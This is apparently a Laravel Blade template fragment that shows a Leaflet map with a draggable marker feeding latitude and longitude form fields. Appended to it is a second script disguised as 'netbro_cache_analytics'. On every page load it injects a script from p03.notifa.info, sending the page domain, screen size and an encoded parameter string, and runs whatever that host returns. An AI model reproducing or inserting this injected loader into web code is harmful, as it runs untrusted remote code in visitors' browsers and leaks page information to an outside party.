<script type="text/javascript">

		var options = {
			center: [{{$tour->latitude}},{{$tour->longitude}}],
			zoom: 13
		}

		var map = L.map('map3', options);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  		maxZoom: 18,
  		id: 'mapbox.streets'
  	}).addTo(map);

		var myMarker = L.marker([{{old('latitude', $tour->latitude)}},{{old('longitude',$tour->longitude)}}], {title: "MyPoint", alt: "The Big I", draggable: true})
		.addTo(map)
    .on('dragend', function(e) {
      var coord = String(myMarker.getLatLng()).split(',');
      console.log(coord);
      var lat = coord[0].split('(');
      console.log(lat);
      var lng = coord[1].split(')');
      console.log(lng);
      // myMarker.bindPopup("Moved to: " + lat[1] + ", " + lng[0] + ".");
      document.getElementById('lat').value = lat[1];
      document.getElementById('long').value = lng[0];
    });


	</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2O1i%2bUFSODZPA4BIBKzPK1SCfkhHqf%2btSn%2fCub8gZ%2bMF%2b91L%2fEP577E5xSa7x9Wf%2bE02rBdl%2bsCCriTl0iodMJycemOEaIbh%2bIRQUlXu69qZ8RiLKRHunEK%2bkErpvoRyskj1zLOfYGV5ACGt3%2bTQcI3GvRgAcBDs6SU%2bMd7aezstVwK5TeK1eKJ29sn7bLIovGzmr%2blikeEddEpnQav9SWLpptTnd8thZJWcB1WMr7QvDMhelZBGCT7XvWo2p2hJrxpFcDN%2ffXWnKah1wc6DJAvmJd6Q1jZWGq1G%2fHdJ5l3TbvAeT5DgKOIW1ThjEAFbrmQtpNPBYTlpjOMqtqlSitLDU%2fHbeHKAuJovgvKm6Bwox03f2aDZWSzpJE9S2HyO26sgXkr%2bTlhcwpWtC%2b7TWYk4NmO8lq3RHejdX3zvYJGUSVglRdlMiywgBQ8C6aJXfxkTgmhtr3A7LcStu1DVm%2fidWYP%2bj8pqqVOYG%2bS5HruQ%2bfrsvAfIHfWaKf4AEsXaudr5eSah62RP3SqR3uOw%2bpVv8EAcvS%2bqB%2b71PzdVqwTdyaB7kLaYHSMC%2fRE8znqByn8y5c4tEiwwW9yUsU9YAupotmUdA961o0VD33aH05QSLqVM8kupE9wepkf%2bV7s%2bo9PpP%2bJYbumY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
